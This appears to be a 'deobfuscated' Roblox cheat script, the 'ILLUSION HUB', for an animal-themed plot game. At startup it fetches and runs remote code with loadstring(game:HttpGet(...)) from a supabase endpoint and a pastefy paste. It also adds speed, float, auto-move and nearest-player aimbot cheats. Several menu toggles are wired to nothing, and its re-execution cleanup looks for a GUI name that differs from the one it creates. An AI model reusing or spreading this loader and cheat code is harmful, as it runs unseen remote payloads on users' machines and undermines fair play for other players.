-- [[ DEOBFUSCATED BY @Casual ]] --
-- Reconstructed from execution trace: logged.txt
-- Game context: Animal-themed plot game (AnimalPodiums / workspace.Plots)
-- Hub: ILLUSION HUB | Float buttons: SPEED, AUTO PLAY, AIMBOT, FLOAT, TP RAGDOLL, DROP

-- ============================================================
-- // [1] GLOBAL SERVICES WITH ERROR HANDLING // --
-- ============================================================

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local TweenService     = game:GetService("TweenService")
local Lighting         = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService  = game:GetService("TeleportService")

-- ============================================================
-- // [2] BASIC SETUP WITH ERROR PROTECTION // --
-- ============================================================

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- Safely load external payloads observed in the execution trace
local function safeLoad(url)
    local ok, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if not ok then
        warn("[ILLUSION_HUB] Loader failed for: " .. tostring(url))
    end
end

-- Loaders fired at startup (as seen in trace)
safeLoad("https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=iMRWZ5TY")
safeLoad("https://pastefy.app/Xi4PCKHE/raw")

-- Runtime state table
local State = {
    -- Feature toggles
    SpeedEnabled    = false,
    AutoPlayEnabled = false,
    AimbotEnabled   = false,
    FloatEnabled    = false,
    TpRagdollEnabled = false,
    DropEnabled     = false,

    -- Configurable values (defaults from trace)
    SpeedBoost      = 30,
    StealSpeed      = 29,
    AutoPlaySpeed   = 59,
    FloatHeight     = 5,
    AimRadius       = 7,
    AimDuration     = 2,
    AutoPlayDir     = "right",

    -- Drag state
    Dragging        = false,
    DragStart       = nil,
    DragObject      = nil,

    -- Animation
    GradientRotation = 0,
}

-- ============================================================
-- // [3] CORE GUI CREATION WITH FALLBACK // --
-- ============================================================

-- Remove any existing instance to allow re-execution
local existing = PlayerGui:FindFirstChild("ILLUSION_HUB")
if existing then existing:Destroy() end

-- Root ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name            = "Keekhub"
ScreenGui.ResetOnSpawn    = false
ScreenGui.IgnoreGuiInset  = true
ScreenGui.Parent          = PlayerGui

-- â”€â”€ Header / title bar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local HeaderFrame = Instance.new("Frame")
HeaderFrame.Name            = "HeaderFrame"
HeaderFrame.Size            = UDim2.new(0, 200, 0, 39)
HeaderFrame.AnchorPoint     = Vector2.new(0.5, 0)
HeaderFrame.Position        = UDim2.new(0.7, 0, 0, 50)
HeaderFrame.BackgroundColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
HeaderFrame.BorderSizePixel = 0
HeaderFrame.ZIndex          = 5
HeaderFrame.Parent          = ScreenGui

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent       = HeaderFrame

local HeaderGradient = Instance.new("UIGradient")
HeaderGradient.Color    = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(1,      0.647059, 0)),
    ColorSequenceKeypoint.new(0.3, Color3.new(0.705882, 0.431373, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.new(1,      0.784314, 0.235294)),
    ColorSequenceKeypoint.new(1,   Color3.new(0.705882, 0.431373, 0)),
})
HeaderGradient.Rotation = 0   -- animated via RenderStepped
HeaderGradient.Parent   = HeaderFrame

local HeaderLabel = Instance.new("TextLabel")
HeaderLabel.Size                = UDim2.new(1, 0, 1, 0)
HeaderLabel.BackgroundTransparency = 1
HeaderLabel.Text                = "ILLUSION HUB"
HeaderLabel.TextColor3          = Color3.new(1, 0.647059, 0)
HeaderLabel.Font                = Enum.Font.GothamBlack
HeaderLabel.TextSize            = 17
HeaderLabel.ZIndex              = 6
HeaderLabel.Parent              = HeaderFrame

-- â”€â”€ Menu / drag button â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local MenuBtn = Instance.new("TextButton")
MenuBtn.Name               = "MenuBtn"
MenuBtn.Size               = UDim2.new(0, 56, 0, 56)
MenuBtn.Position           = UDim2.new(0, 16, 0.5, -28)
MenuBtn.BackgroundColor3   = Color3.new(0.0392157, 0.0392157, 0.0392157)
MenuBtn.Text               = ""
MenuBtn.AutoButtonColor    = false
MenuBtn.Active             = true
MenuBtn.ZIndex             = 10
MenuBtn.Parent             = ScreenGui

local MenuBtnCorner = Instance.new("UICorner")
MenuBtnCorner.CornerRadius = UDim.new(0, 12)
MenuBtnCorner.Parent       = MenuBtn

local MenuBtnStroke = Instance.new("UIStroke")
MenuBtnStroke.Thickness  = 1.5
MenuBtnStroke.Color      = Color3.new(1, 0.647059, 0)
MenuBtnStroke.Transparency = 0.3
MenuBtnStroke.Parent     = MenuBtn

local MenuIcon = Instance.new("TextLabel")
MenuIcon.Size                = UDim2.new(1, 0, 1, 0)
MenuIcon.BackgroundTransparency = 1
MenuIcon.Text                = "â˜°"
MenuIcon.TextColor3          = Color3.new(1, 0.647059, 0)
MenuIcon.Font                = Enum.Font.GothamBlack
MenuIcon.TextSize            = 28
MenuIcon.ZIndex              = 11
MenuIcon.Parent              = MenuBtn

-- â”€â”€ Main feature panel â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local MainPanel = Instance.new("Frame")
MainPanel.Name             = "MainPanel"
MainPanel.Size             = UDim2.new(0, 260, 0, 0)
MainPanel.AnchorPoint      = Vector2.new(0.5, 0.5)
MainPanel.Position         = UDim2.new(0.5, 0, 0.5, 0)
MainPanel.BackgroundColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
MainPanel.BorderSizePixel  = 0
MainPanel.ClipsDescendants = true
MainPanel.Visible          = false
MainPanel.ZIndex           = 8
MainPanel.Parent           = ScreenGui

local MainPanelCorner = Instance.new("UICorner")
MainPanelCorner.CornerRadius = UDim.new(0, 14)
MainPanelCorner.Parent       = MainPanel

local MainPanelStroke = Instance.new("UIStroke")
MainPanelStroke.Thickness  = 2
MainPanelStroke.Color      = Color3.new(1, 0.647059, 0)
MainPanelStroke.Transparency = 0.3
MainPanelStroke.Parent     = MainPanel

-- Panel title bar
local PanelHeader = Instance.new("Frame")
PanelHeader.Size             = UDim2.new(1, 0, 0, 42)
PanelHeader.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
PanelHeader.BorderSizePixel  = 0
PanelHeader.ZIndex           = 11
PanelHeader.Parent           = MainPanel

local PanelHeaderStroke = Instance.new("UIStroke")
PanelHeaderStroke.Thickness  = 1.5
PanelHeaderStroke.Color      = Color3.new(0.705882, 0.431373, 0)
PanelHeaderStroke.Parent     = PanelHeader

local PanelTitle = Instance.new("TextLabel")
PanelTitle.Size                 = UDim2.new(1, -50, 1, 0)
PanelTitle.Position             = UDim2.new(0, 10, 0, 0)
PanelTitle.BackgroundTransparency = 1
PanelTitle.Text                 = "Features"
PanelTitle.TextColor3           = Color3.new(1, 0.647059, 0)
PanelTitle.Font                 = Enum.Font.GothamBlack
PanelTitle.TextSize             = 15
PanelTitle.TextXAlignment       = Enum.TextXAlignment.Left
PanelTitle.ZIndex               = 12
PanelTitle.Parent               = PanelHeader

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size               = UDim2.new(0, 36, 0, 36)
CloseBtn.Position           = UDim2.new(1, -40, 0.5, -18)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text               = "âœ•"
CloseBtn.TextColor3         = Color3.new(0.705882, 0.431373, 0)
CloseBtn.Font               = Enum.Font.GothamBlack
CloseBtn.TextSize           = 20
CloseBtn.ZIndex             = 11
CloseBtn.Parent             = PanelHeader

-- Scrolling content area
local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size                 = UDim2.new(1, -12, 1, -50)
ScrollingFrame.Position             = UDim2.new(0, 6, 0, 44)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel      = 0
ScrollingFrame.ScrollBarThickness   = 3
ScrollingFrame.ScrollBarImageColor3 = Color3.new(1, 0.647059, 0)
ScrollingFrame.CanvasSize           = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize  = Enum.AutomaticSize.Y
ScrollingFrame.ScrollingDirection   = Enum.ScrollingDirection.Y
ScrollingFrame.ElasticBehavior      = Enum.ElasticBehavior.Always
ScrollingFrame.ZIndex               = 10
ScrollingFrame.Parent               = MainPanel

local ScrollLayout = Instance.new("UIListLayout")
ScrollLayout.Padding  = UDim.new(0, 4)
ScrollLayout.Parent   = ScrollingFrame

local ScrollPadding = Instance.new("UIPadding")
ScrollPadding.PaddingTop    = UDim.new(0, 3)
ScrollPadding.PaddingBottom = UDim.new(0, 8)
ScrollPadding.Parent        = ScrollingFrame

-- â”€â”€ Helper: create a toggle row in the scrolling list â”€â”€â”€â”€â”€â”€â”€
local function createToggleRow(labelText, defaultState)
    local RowFrame = Instance.new("Frame")
    RowFrame.Size             = UDim2.new(1, 0, 0, 44)
    RowFrame.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
    RowFrame.BorderSizePixel  = 0
    RowFrame.ZIndex           = 11
    RowFrame.Parent           = ScrollingFrame

    local RowCorner = Instance.new("UICorner")
    RowCorner.CornerRadius = UDim.new(0, 8)
    RowCorner.Parent       = RowFrame

    local RowStroke = Instance.new("UIStroke")
    RowStroke.Thickness  = 1
    RowStroke.Color      = Color3.new(0.705882, 0.431373, 0)
    RowStroke.Transparency = 0.6
    RowStroke.Parent     = RowFrame

    local Indicator = Instance.new("Frame")
    Indicator.Size             = UDim2.new(0, 10, 0, 10)
    Indicator.Position         = UDim2.new(0, 10, 0.5, -5)
    Indicator.BackgroundColor3 = defaultState
        and Color3.new(1, 0.647059, 0)
        or  Color3.new(0.235294, 0.235294, 0.235294)
    Indicator.BorderSizePixel  = 0
    Indicator.ZIndex           = 12
    Indicator.Parent           = RowFrame

    local IndCorner = Instance.new("UICorner")
    IndCorner.CornerRadius = UDim.new(1, 0)
    IndCorner.Parent       = Indicator

    local RowLabel = Instance.new("TextLabel")
    RowLabel.Size                 = UDim2.new(1, -24, 1, 0)
    RowLabel.Position             = UDim2.new(0, 28, 0, 0)
    RowLabel.BackgroundTransparency = 1
    RowLabel.Text                 = labelText
    RowLabel.TextColor3           = defaultState
        and Color3.new(1, 1, 1)
        or  Color3.new(0.470588, 0.470588, 0.470588)
    RowLabel.Font                 = Enum.Font.GothamBold
    RowLabel.TextSize             = 13
    RowLabel.TextXAlignment       = Enum.TextXAlignment.Left
    RowLabel.ZIndex               = 12
    RowLabel.Parent               = RowFrame

    -- Full-row hitbox button (transparent, sits on top)
    local HitBtn = Instance.new("TextButton")
    HitBtn.Size               = UDim2.new(1, 0, 1, 0)
    HitBtn.BackgroundTransparency = 1
    HitBtn.Text               = ""
    HitBtn.ZIndex             = 14
    HitBtn.Parent             = RowFrame

    return HitBtn, Indicator, RowLabel
end

-- Populate toggle rows (features seen in trace)
local featureList = {
    "Unwalk",
    "Performance / XRay",
    "Dark Sky",
    "Spin Bot",
    "Anti Ragdoll",
    "Infinite Jump",
    "Lock UI Position",
    "Drop (Walk Fling)",
    "Auto Grab",
    "Float",
}

local toggleStates = {}
for _, featureName in ipairs(featureList) do
    local btn, indicator, lbl = createToggleRow(featureName, false)
    toggleStates[featureName] = false
    btn.MouseButton1Click:Connect(function()
        toggleStates[featureName] = not toggleStates[featureName]
        local on = toggleStates[featureName]
        indicator.BackgroundColor3 = on
            and Color3.new(1, 0.647059, 0)
            or  Color3.new(0.235294, 0.235294, 0.235294)
        lbl.TextColor3 = on
            and Color3.new(1, 1, 1)
            or  Color3.new(0.470588, 0.470588, 0.470588)
    end)
end

-- â”€â”€ Progress bar (bottom of screen) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local ProgressBar = Instance.new("Frame")
ProgressBar.Name             = "progressBar"
ProgressBar.Size             = UDim2.new(0, 260, 0, 48)
ProgressBar.Position         = UDim2.new(0.5, -130, 1, -64)
ProgressBar.BackgroundColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
ProgressBar.BorderSizePixel  = 0
ProgressBar.ClipsDescendants = true
ProgressBar.ZIndex           = 8
ProgressBar.Parent           = ScreenGui

local PBCorner = Instance.new("UICorner")
PBCorner.CornerRadius = UDim.new(0, 14)
PBCorner.Parent       = ProgressBar

local PBStroke = Instance.new("UIStroke")
PBStroke.Thickness   = 1.5
PBStroke.Color       = Color3.new(1, 0.647059, 0)
PBStroke.Transparency = 0.3
PBStroke.Parent      = ProgressBar

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size                 = UDim2.new(0, 100, 0, 18)
StatusLabel.Position             = UDim2.new(0, 10, 0, 4)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text                 = "READY"
StatusLabel.TextColor3           = Color3.new(1, 1, 1)
StatusLabel.Font                 = Enum.Font.GothamBold
StatusLabel.TextSize             = 13
StatusLabel.TextXAlignment       = Enum.TextXAlignment.Left
StatusLabel.ZIndex               = 9
StatusLabel.Parent               = ProgressBar

-- Track bar inside progress bar
local TrackBg = Instance.new("Frame")
TrackBg.Size             = UDim2.new(1, -16, 0, 5)
TrackBg.Position         = UDim2.new(0, 8, 1, -9)
TrackBg.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TrackBg.BorderSizePixel  = 0
TrackBg.ZIndex           = 9
TrackBg.Parent           = ProgressBar

local TrackBgCorner = Instance.new("UICorner")
TrackBgCorner.CornerRadius = UDim.new(1, 0)
TrackBgCorner.Parent       = TrackBg

local TrackFill = Instance.new("Frame")
TrackFill.Size             = UDim2.new(0, 0, 1, 0)
TrackFill.BackgroundColor3 = Color3.new(1, 0.647059, 0)
TrackFill.BorderSizePixel  = 0
TrackFill.ZIndex           = 10
TrackFill.Parent           = TrackBg

local TrackFillCorner = Instance.new("UICorner")
TrackFillCorner.CornerRadius = UDim.new(1, 0)
TrackFillCorner.Parent       = TrackFill

-- Radius stepper (inside progress bar)
local RadiusFrame = Instance.new("Frame")
RadiusFrame.Size             = UDim2.new(0, 60, 0, 18)
RadiusFrame.Position         = UDim2.new(1, -130, 0, 2)
RadiusFrame.BackgroundTransparency = 1
RadiusFrame.ZIndex           = 9
RadiusFrame.Parent           = ProgressBar

local RadiusDecBtn = Instance.new("TextButton")
RadiusDecBtn.Size             = UDim2.new(0, 14, 0, 18)
RadiusDecBtn.Position         = UDim2.new(0, 0, 0, 0)
RadiusDecBtn.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
RadiusDecBtn.Text             = "-"
RadiusDecBtn.TextColor3       = Color3.new(1, 0.647059, 0)
RadiusDecBtn.Font             = Enum.Font.GothamBold
RadiusDecBtn.TextSize         = 12
RadiusDecBtn.BorderSizePixel  = 0
RadiusDecBtn.ZIndex           = 10
RadiusDecBtn.Parent           = RadiusFrame

local RadiusDecCorner = Instance.new("UICorner")
RadiusDecCorner.CornerRadius = UDim.new(0, 4)
RadiusDecCorner.Parent       = RadiusDecBtn

local RadiusBox = Instance.new("TextBox")
RadiusBox.Size             = UDim2.new(0, 28, 0, 18)
RadiusBox.Position         = UDim2.new(0, 16, 0, 0)
RadiusBox.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
RadiusBox.Text             = tostring(State.AimRadius)
RadiusBox.TextColor3       = Color3.new(1, 1, 1)
RadiusBox.Font             = Enum.Font.GothamBold
RadiusBox.TextSize         = 10
RadiusBox.TextXAlignment   = Enum.TextXAlignment.Center
RadiusBox.BorderSizePixel  = 0
RadiusBox.ClearTextOnFocus = false
RadiusBox.ZIndex           = 10
RadiusBox.Parent           = RadiusFrame

local RadiusIncBtn = Instance.new("TextButton")
RadiusIncBtn.Size             = UDim2.new(0, 14, 0, 18)
RadiusIncBtn.Position         = UDim2.new(0, 46, 0, 0)
RadiusIncBtn.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
RadiusIncBtn.Text             = "+"
RadiusIncBtn.TextColor3       = Color3.new(1, 0.647059, 0)
RadiusIncBtn.Font             = Enum.Font.GothamBold
RadiusIncBtn.TextSize         = 12
RadiusIncBtn.BorderSizePixel  = 0
RadiusIncBtn.ZIndex           = 10
RadiusIncBtn.Parent           = RadiusFrame

local RadiusIncCorner = Instance.new("UICorner")
RadiusIncCorner.CornerRadius = UDim.new(0, 4)
RadiusIncCorner.Parent       = RadiusIncBtn

local RadiusLabel = Instance.new("TextLabel")
RadiusLabel.Size              = UDim2.new(0, 60, 0, 8)
RadiusLabel.Position          = UDim2.new(1, -130, 0, 21)
RadiusLabel.BackgroundTransparency = 1
RadiusLabel.Text              = "radius"
RadiusLabel.TextColor3        = Color3.new(0.705882, 0.431373, 0)
RadiusLabel.Font              = Enum.Font.Gotham
RadiusLabel.TextSize          = 7
RadiusLabel.TextXAlignment    = Enum.TextXAlignment.Center
RadiusLabel.ZIndex            = 9
RadiusLabel.Parent            = ProgressBar

-- Duration stepper
local DurFrame = Instance.new("Frame")
DurFrame.Size             = UDim2.new(0, 60, 0, 18)
DurFrame.Position         = UDim2.new(1, -66, 0, 2)
DurFrame.BackgroundTransparency = 1
DurFrame.ZIndex           = 9
DurFrame.Parent           = ProgressBar

local DurDecBtn = Instance.new("TextButton")
DurDecBtn.Size             = UDim2.new(0, 14, 0, 18)
DurDecBtn.Position         = UDim2.new(0, 0, 0, 0)
DurDecBtn.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
DurDecBtn.Text             = "-"
DurDecBtn.TextColor3       = Color3.new(1, 0.647059, 0)
DurDecBtn.Font             = Enum.Font.GothamBold
DurDecBtn.TextSize         = 12
DurDecBtn.BorderSizePixel  = 0
DurDecBtn.ZIndex           = 10
DurDecBtn.Parent           = DurFrame

local DurDecCorner = Instance.new("UICorner")
DurDecCorner.CornerRadius = UDim.new(0, 4)
DurDecCorner.Parent       = DurDecBtn

local DurBox = Instance.new("TextBox")
DurBox.Size             = UDim2.new(0, 28, 0, 18)
DurBox.Position         = UDim2.new(0, 16, 0, 0)
DurBox.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
DurBox.Text             = tostring(State.AimDuration)
DurBox.TextColor3       = Color3.new(1, 1, 1)
DurBox.Font             = Enum.Font.GothamBold
DurBox.TextSize         = 10
DurBox.TextXAlignment   = Enum.TextXAlignment.Center
DurBox.BorderSizePixel  = 0
DurBox.ClearTextOnFocus = false
DurBox.ZIndex           = 10
DurBox.Parent           = DurFrame

local DurIncBtn = Instance.new("TextButton")
DurIncBtn.Size             = UDim2.new(0, 14, 0, 18)
DurIncBtn.Position         = UDim2.new(0, 46, 0, 0)
DurIncBtn.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
DurIncBtn.Text             = "+"
DurIncBtn.TextColor3       = Color3.new(1, 0.647059, 0)
DurIncBtn.Font             = Enum.Font.GothamBold
DurIncBtn.TextSize         = 12
DurIncBtn.BorderSizePixel  = 0
DurIncBtn.ZIndex           = 10
DurIncBtn.Parent           = DurFrame

local DurIncCorner = Instance.new("UICorner")
DurIncCorner.CornerRadius = UDim.new(0, 4)
DurIncCorner.Parent       = DurIncBtn

local DurLabel = Instance.new("TextLabel")
DurLabel.Size              = UDim2.new(0, 60, 0, 8)
DurLabel.Position          = UDim2.new(1, -66, 0, 21)
DurLabel.BackgroundTransparency = 1
DurLabel.Text              = "dur"
DurLabel.TextColor3        = Color3.new(0.705882, 0.431373, 0)
DurLabel.Font              = Enum.Font.Gotham
DurLabel.TextSize          = 7
DurLabel.TextXAlignment    = Enum.TextXAlignment.Center
DurLabel.ZIndex            = 9
DurLabel.Parent            = ProgressBar

-- ============================================================
-- // [4] FLOAT BUTTON BUILDER // --
-- ============================================================

local FloatButtons = {}

local function createFloatButton(name, keybind, order)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0,120,0,32)
    Btn.Position = UDim2.new(0,16,0,110 + (order*36))
    Btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
    Btn.Text = name.." ["..keybind.."]"
    Btn.TextColor3 = Color3.fromRGB(255,165,0)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 12
    Btn.Parent = ScreenGui
    
    local corner = Instance.new("UICorner",Btn)
    corner.CornerRadius = UDim.new(0,8)

    FloatButtons[name] = Btn
    return Btn
end

local SpeedBtn = createFloatButton("SPEED","V",0)
local AutoBtn  = createFloatButton("AUTO","E",1)
local AimBtn   = createFloatButton("AIMBOT","Q",2)
local FloatBtn = createFloatButton("FLOAT","F",3)

-- ============================================================
-- // [5] MENU OPEN/CLOSE // --
-- ============================================================

MenuBtn.MouseButton1Click:Connect(function()
    MainPanel.Visible = not MainPanel.Visible
end)

CloseBtn.MouseButton1Click:Connect(function()
    MainPanel.Visible = false
end)

-- ============================================================
-- // [6] DRAG MENU BUTTON // --
-- ============================================================

MenuBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        State.Dragging = true
        State.DragStart = input.Position
        State.DragObject = MenuBtn.Position
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        State.Dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if State.Dragging then
        local delta = input.Position - State.DragStart
        MenuBtn.Position = UDim2.new(
            State.DragObject.X.Scale,
            State.DragObject.X.Offset + delta.X,
            State.DragObject.Y.Scale,
            State.DragObject.Y.Offset + delta.Y
        )
    end
end)

-- ============================================================
-- // [7] SPEED SYSTEM // --
-- ============================================================

local function getHumanoid()
    local char = LocalPlayer.Character
    if not char then return end
    return char:FindFirstChildOfClass("Humanoid")
end

SpeedBtn.MouseButton1Click:Connect(function()
    State.SpeedEnabled = not State.SpeedEnabled
end)

RunService.RenderStepped:Connect(function()
    if State.SpeedEnabled then
        local hum = getHumanoid()
        if hum then
            hum.WalkSpeed = State.SpeedBoost
        end
    end
end)

-- ============================================================
-- // [8] AUTO PLAY SYSTEM // --
-- ============================================================

AutoBtn.MouseButton1Click:Connect(function()
    State.AutoPlayEnabled = not State.AutoPlayEnabled
end)

RunService.RenderStepped:Connect(function()
    if not State.AutoPlayEnabled then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    if State.AutoPlayDir == "right" then
        hum:Move(Vector3.new(1,0,0),true)
    else
        hum:Move(Vector3.new(-1,0,0),true)
    end
end)

-- ============================================================
-- // [9] SIMPLE AIMBOT (NEAREST PLAYER) // --
-- ============================================================

local function getNearestPlayer()
    local closest
    local dist = math.huge
    
    for _,plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
            local my = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            
            if hrp and my then
                local d = (hrp.Position - my.Position).Magnitude
                if d < dist then
                    dist = d
                    closest = hrp
                end
            end
        end
    end
    
    return closest
end

AimBtn.MouseButton1Click:Connect(function()
    State.AimbotEnabled = not State.AimbotEnabled
end)

RunService.RenderStepped:Connect(function()
    if not State.AimbotEnabled then return end
    
    local my = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local target = getNearestPlayer()
    
    if my and target then
        my.CFrame = CFrame.new(my.Position, target.Position)
    end
end)

-- ============================================================
-- // [10] FLOAT SYSTEM // --
-- ============================================================

FloatBtn.MouseButton1Click:Connect(function()
    State.FloatEnabled = not State.FloatEnabled
end)

RunService.RenderStepped:Connect(function()
    if not State.FloatEnabled then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        root.Velocity = Vector3.new(0,State.FloatHeight,0)
    end
end)

-- ============================================================
-- // [11] KEYBINDS // --
-- ============================================================

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    
    if input.KeyCode == Enum.KeyCode.V then
        State.SpeedEnabled = not State.SpeedEnabled
    end
    
    if input.KeyCode == Enum.KeyCode.E then
        State.AutoPlayEnabled = not State.AutoPlayEnabled
    end
    
    if input.KeyCode == Enum.KeyCode.Q then
        State.AimbotEnabled = not State.AimbotEnabled
    end
    
    if input.KeyCode == Enum.KeyCode.F then
        State.FloatEnabled = not State.FloatEnabled
    end
end)

-- ============================================================
-- // [12] HEADER GRADIENT ANIMATION // --
-- ============================================================

RunService.RenderStepped:Connect(function(dt)
    State.GradientRotation += dt * 40
    HeaderGradient.Rotation = State.GradientRotation
end)

StatusLabel.Text = "LOADED"
TrackFill:TweenSize(
    UDim2.new(1,0,1,0),
    Enum.EasingDirection.Out,
    Enum.EasingStyle.Quad,
    1,
    true
)
